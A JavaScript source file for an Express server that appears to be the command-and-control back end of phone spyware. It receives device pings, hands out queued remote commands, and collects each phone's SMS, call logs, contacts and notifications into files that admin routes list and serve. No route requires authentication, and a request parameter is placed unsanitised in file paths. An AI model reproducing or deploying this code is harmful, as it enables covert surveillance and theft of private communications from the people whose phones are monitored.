const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
const PORT = process.env.PORT || 3000;

const UPLOADS_DIR = path.join(__dirname, 'uploads');
if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR);

app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
app.use(express.static(__dirname));

// Memory store for devices
let devicesStatus = {}; 

// --- PHONE API ---
app.post('/api/status', (req, res) => {
    let { device_id, model, battery, version, charging } = req.body;
    if (!device_id) return res.status(400).json({ error: "Missing ID" });

    const id = device_id.toString().trim().toUpperCase();
    const pendingCommand = (devicesStatus[id] && devicesStatus[id].command) ? devicesStatus[id].command : "none";

    // Update Device Info
    devicesStatus[id] = {
        id: id,
        model: model || "Unknown Device",
        battery: battery || 0,
        version: version || "--",
        charging: (charging === 'true' || charging === true),
        lastSeen: Date.now(),
        command: "none" 
    };

    console.log(`📡 [PING] ${id} | Model: ${model} | Cmd: ${pendingCommand}`);
    res.json({ status: "success", command: pendingCommand });
});

app.post('/api/upload_data', (req, res) => {
    let { device_id, type, data } = req.body;
    if (!device_id) return res.status(400).json({ error: "No ID" });

    const id = device_id.toString().trim().toUpperCase();
    const filePath = path.join(UPLOADS_DIR, `${id}_${type}.json`);

    try {
        let parsedData = typeof data === 'string' ? JSON.parse(data) : data;
        const historyTypes = ['notifications', 'sms', 'call_logs', 'contacts'];
        
        if (historyTypes.includes(type)) {
            let existingData = [];
            if (fs.existsSync(filePath)) {
                try { existingData = JSON.parse(fs.readFileSync(filePath, 'utf8')); } catch (e) { existingData = []; }
            }
            if (!Array.isArray(existingData)) existingData = [];
            const finalData = Array.isArray(parsedData) ? [...parsedData, ...existingData] : [parsedData, ...existingData];
            fs.writeFileSync(filePath, JSON.stringify(finalData.slice(0, 1000), null, 2));
        } else {
            fs.writeFileSync(filePath, JSON.stringify(parsedData, null, 2));
        }
        console.log(`📥 [RECEIVED] ${type} from ${id}`);
        res.json({ status: "success" });
    } catch (error) {
        res.status(500).json({ status: "error" });
    }
});

// --- ADMIN API ---

// 🌟 NAYA FEATURE: Saare devices ki list bhejna
app.get('/api/admin/all-devices', (req, res) => {
    // Hum sirf wahi devices bhejenge jo memory mein hain (online/recent)
    // Aur agar aap chahte hain ki offline devices bhi dikhe jo files mein hain, toh files scan kar sakte hain
    res.json(devicesStatus);
});

app.get('/api/device-status/:id', (req, res) => {
    const id = req.params.id.toUpperCase().trim();
    const device = devicesStatus[id];
    if (!device) return res.json({ id: id, isOnline: false, model: "Not Registered" });
    const isOnline = (Date.now() - device.lastSeen) < 60000;
    res.json({ ...device, isOnline });
});

app.post('/api/send-command', (req, res) => {
    let { device_id, command } = req.body;
    if (!device_id) return res.status(400).json({ error: "ID required" });
    const id = device_id.toUpperCase().trim();
    if (!devicesStatus[id]) devicesStatus[id] = { id: id, model: "Unknown", lastSeen: 0 };
    devicesStatus[id].command = command;
    console.log(`🚀 [CMD QUEUED] ${command} -> ${id}`);
    res.json({ status: "success" });
});

app.get('/api/get-data/:device_id/:type', (req, res) => {
    const id = req.params.device_id.toUpperCase().trim();
    const filePath = path.join(UPLOADS_DIR, `${id}_${req.params.type}.json`);
    if (fs.existsSync(filePath)) res.sendFile(filePath);
    else res.json([]);
});

app.listen(PORT, () => console.log(`🔥 SERVER RUNNING ON PORT ${PORT}`));
